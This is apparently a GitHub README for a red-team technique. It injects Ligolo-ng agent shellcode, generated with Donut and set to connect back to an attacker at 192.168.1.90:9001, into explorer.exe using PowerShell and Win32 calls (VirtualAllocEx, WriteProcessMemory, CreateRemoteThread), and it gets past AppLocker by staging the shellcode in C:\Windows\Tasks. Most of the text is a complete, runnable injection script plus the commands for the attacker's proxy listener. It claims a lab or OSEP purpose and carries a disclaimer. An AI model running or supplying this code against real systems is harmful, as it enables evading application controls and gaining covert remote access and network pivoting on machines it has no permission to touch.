# 🧬 Ligolo Agent Injection via PowerShell & AppLocker Bypass

This repository demonstrates how to inject a [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) agent shellcode into a remote process using pure PowerShell and basic Win32 API calls, bypassing AppLocker by executing from a trusted path (`C:\Windows\Tasks`) and leveraging in-memory execution.

## 🔧 Requirements

- Windows target with:
  - AppLocker enabled
  - .NET Framework 4.0+
  - CLM (Constrained Language Mode) bypassed
- Shellcode generated with [Donut](https://github.com/TheWover/donut)
- Ligolo-ng proxy running on attacker's machine (`./proxy -selfcert`)

## 🧪 Step-by-Step Usage

### 1. Generate Shellcode

Use Donut to convert your Ligolo agent executable into shellcode:

```bash
./donut.exe -f 1 -o agent.bin -a 2 -p "-connect 192.168.1.90:9001 -ignore-cert" -i agent.exe
```

This will create a raw shellcode file named `agent.bin`.

### 2. Deploy Shellcode to Target

Copy `agent.bin` to the trusted directory into the target host:

```powershell
Copy-Item .\agent.bin "C:\Windows\Tasks\agent.bin"
```

### 3. Execute Shellcode via PowerShell

Use the included PowerShell script to:

- Load the shellcode from disk
- Inject it into `explorer.exe`
- Trigger execution via `CreateRemoteThread`

```powershell
$shellcode = [System.IO.File]::ReadAllBytes("C:\Windows\Tasks\agent.bin")
$procid = (Get-Process -Name explorer).Id
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ -Language CSharp

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Failed to open process."
    exit
}
$size = $shellcode.Length
$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "Failed to allocate memory in the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}
$out = 0
$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
if (-not $result) {
    Write-Error "Failed to write shellcode to the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}
$thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread in the target process."
}
[Kernel32]::CloseHandle($hProcess)
Write-Output "Ligolo Agent Shellcode injected successfully, check the Ligolo Proxy Server interface!"
```

### 4. Monitor Connection

On the attacker machine, you should now see the agent connected in the Ligolo proxy:

```bash
./proxy --selfcert --laddr 0.0.0.0:9001
```

---

## ⚠️ Notes

- This script uses classic `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` calls to execute the payload.
- `agent.bin` is injected into `explorer.exe` which is typically running with user-level privileges.
- Designed for **post-exploitation** in **controlled lab environments** such as OSEP or Red Team simulations.

---

## 🛡 Disclaimer

This project is intended for **educational and authorized testing purposes only**. Use it exclusively in environments you have explicit permission to assess.

---



